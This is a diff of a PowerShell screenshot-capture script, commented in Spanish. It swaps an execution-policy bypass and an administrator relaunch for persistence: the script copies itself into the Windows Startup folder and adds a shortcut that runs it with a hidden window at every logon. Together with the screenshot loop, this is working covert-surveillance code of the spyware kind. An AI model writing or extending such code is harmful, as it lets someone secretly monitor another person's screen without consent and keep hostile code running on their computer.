@@ -35,13 +35,16 @@ for ($i = 1; $i -le $numberOfScreenshots; $i++) {
     Start-Sleep -Seconds $intervalSeconds
 }
 
-# Obtener la ubicación del script actual
+# Copiar el script a la carpeta de inicio de Windows
 $scriptPath = $MyInvocation.MyCommand.Path
+$startupFolder = [Environment]::GetFolderPath("Startup")
+$scriptDestination = Join-Path -Path $startupFolder -ChildPath "Screenshot_Script.ps1"
+Copy-Item -Path $scriptPath -Destination $scriptDestination -Force
 
-# Crear un archivo de comando por lotes (batch) para ejecutar el script como administrador
-$batchScriptPath = "$env:TEMP\RunAsAdmin.bat"
-$batchScriptContent = "@echo off`npowershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`""
-$batchScriptContent | Out-File -FilePath $batchScriptPath -Encoding ASCII
-
-# Ejecutar el archivo de comando por lotes como administrador
-Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batchScriptPath`"" -Verb RunAs
+# Crear un acceso directo en la carpeta de inicio de Windows para ejecutar el script
+$shortcutPath = Join-Path -Path $startupFolder -ChildPath "Screenshot_Script.lnk"
+$wScriptShell = New-Object -ComObject WScript.Shell
+$shortcut = $wScriptShell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = "powershell.exe"
+$shortcut.Arguments = "-WindowStyle Hidden -File `"$scriptDestination`""
+$shortcut.Save()
